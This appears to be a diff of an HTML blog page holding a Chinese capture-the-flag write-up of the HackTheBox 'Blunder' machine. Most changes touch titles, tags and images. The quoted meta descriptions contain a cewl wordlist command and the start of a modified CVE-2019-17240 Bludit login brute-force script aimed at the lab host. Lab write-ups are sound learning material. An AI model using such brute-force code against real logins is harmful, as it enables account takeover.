@@ -10,11 +10,11 @@ Bludit 3.9.2版本中的 bl-kernel/security.class.php 一些代码将检查主�
 看了wp之后，我们找到了本来没有被dirsearch扫到的/todo.txt：
 -Update the CMS-Turn off FTP - DONE-Remove old users - DONE-Inform fergus that the new blog needs images - PENDING可以猜到用户名可能是 fergus ，但是密码需要用到cewl来生成弱口令字典
 cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/然后我们利用改装过后的CVE-2019-17240的poc来打：
-#!/usr/bin/env python3import reimport requestsdef open_ressources(file_path):return [item.replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;) for item in open(file_path).readlines()]host = &#39;http://10.10.10.191&#39;login_url = host &#43; &#39;/admin/login&#39;username = &#39;fergus&#39;wordlist = open_ressources(&#39;wordlist.'><title>HackTheBoxBlunder</title>
+#!/usr/bin/env python3import reimport requestsdef open_ressources(file_path):return [item.replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;) for item in open(file_path).readlines()]host = &#39;http://10.10.10.191&#39;login_url = host &#43; &#39;/admin/login&#39;username = &#39;fergus&#39;wordlist = open_ressources(&#39;wordlist.'><title>HackTheBox::Blunder</title>
 
 <link rel='canonical' href='https://anthem-whisper.github.io/p/hacktheboxblunder/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='HackTheBoxBlunder'>
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='HackTheBox::Blunder'>
 <meta property='og:description' content='玩一手HTB
  打开靶机就一些无关紧要的文字，dirsearch扫一下目录可以扫到登录后台，我们可以发现靶机使用了 Bludit cms
 在看了一些Bludit的漏洞之后，发现在没有登录、我们又只有一个后台地址的情况下，弱口令比较靠谱
@@ -27,8 +27,8 @@ cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/然后我们利用改装过
 #!/usr/bin/env python3import reimport requestsdef open_ressources(file_path):return [item.replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;) for item in open(file_path).readlines()]host = &#39;http://10.10.10.191&#39;login_url = host &#43; &#39;/admin/login&#39;username = &#39;fergus&#39;wordlist = open_ressources(&#39;wordlist.'>
 <meta property='og:url' content='https://anthem-whisper.github.io/p/hacktheboxblunder/'>
 <meta property='og:site_name' content='wh1sper'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' />
-<meta name="twitter:title" content="HackTheBoxBlunder">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='HackTheBox' /><meta property='article:tag' content='CVE' /><meta property='article:published_time' content='2020-07-16T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-07-16T00:00:00&#43;00:00'/><meta property='og:image' content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180606.png' />
+<meta name="twitter:title" content="HackTheBox::Blunder">
 <meta name="twitter:description" content="玩一手HTB
  打开靶机就一些无关紧要的文字，dirsearch扫一下目录可以扫到登录后台，我们可以发现靶机使用了 Bludit cms
 在看了一些Bludit的漏洞之后，发现在没有登录、我们又只有一个后台地址的情况下，弱口令比较靠谱
@@ -38,7 +38,8 @@ Bludit 3.9.2版本中的 bl-kernel/security.class.php 一些代码将检查主�
 看了wp之后，我们找到了本来没有被dirsearch扫到的/todo.txt：
 -Update the CMS-Turn off FTP - DONE-Remove old users - DONE-Inform fergus that the new blog needs images - PENDING可以猜到用户名可能是 fergus ，但是密码需要用到cewl来生成弱口令字典
 cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/然后我们利用改装过后的CVE-2019-17240的poc来打：
-#!/usr/bin/env python3import reimport requestsdef open_ressources(file_path):return [item.replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;) for item in open(file_path).readlines()]host = &#39;http://10.10.10.191&#39;login_url = host &#43; &#39;/admin/login&#39;username = &#39;fergus&#39;wordlist = open_ressources(&#39;wordlist.">
+#!/usr/bin/env python3import reimport requestsdef open_ressources(file_path):return [item.replace(&amp;quot;\n&amp;quot;, &amp;quot;&amp;quot;) for item in open(file_path).readlines()]host = &#39;http://10.10.10.191&#39;login_url = host &#43; &#39;/admin/login&#39;username = &#39;fergus&#39;wordlist = open_ressources(&#39;wordlist."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180606.png' />
     </head>
     <body class="">
     <script>
@@ -208,22 +209,47 @@ cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/然后我们利用改装过
         </a>
     </div>
 
-    <article class="main-article">
+    <article class="has-image main-article">
     <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hacktheboxblunder/">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180606.png" loading="lazy" alt="Featured image of post HackTheBox::Blunder" />
+                
+            </a>
+        </div>
+    
 
     <div class="article-details">
     
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F/" >
+                渗透
+            </a>
+        
+    </header>
+    
 
     <h2 class="article-title">
-        <a href="/p/hacktheboxblunder/">HackTheBoxBlunder</a>
+        <a href="/p/hacktheboxblunder/">HackTheBox::Blunder</a>
     </h2>
 
-    </div>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Jul 16, 2020</time>
+    </footer></div>
 </header>
 
     <section class="article-content">
-    <p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180606.png" alt=""  /></p>
-<p>玩一手HTB</p>
+    <p>玩一手HTB</p>
 <hr>
 <p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180614.png" alt="img"  /></p>
 <p>打开靶机就一些无关紧要的文字，dirsearch扫一下目录可以扫到登录后台，我们可以发现靶机使用了 <code>Bludit</code> cms</p>
@@ -407,6 +433,14 @@ root@blunder:/var/www/bludit-3.9.2#
 
     <footer class="article-footer">
     
+    <section class="article-tags">
+        
+            <a href="/tags/hackthebox/">HackTheBox</a>
+        
+            <a href="/tags/cve/">CVE</a>
+        
+    </section>
+
 
     
     <section class="article-copyright">
@@ -427,6 +461,49 @@ root@blunder:/var/www/bludit-3.9.2#
 
     <aside class="related-contents--wrapper">
     
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/hacktheboxtabby/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180858.png" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180858.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox::Tabby</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/hacktheboxtraceback/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180751.png" loading="lazy" data-key="" data-hash="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180751.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox::Traceback</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
     
 </aside>
 
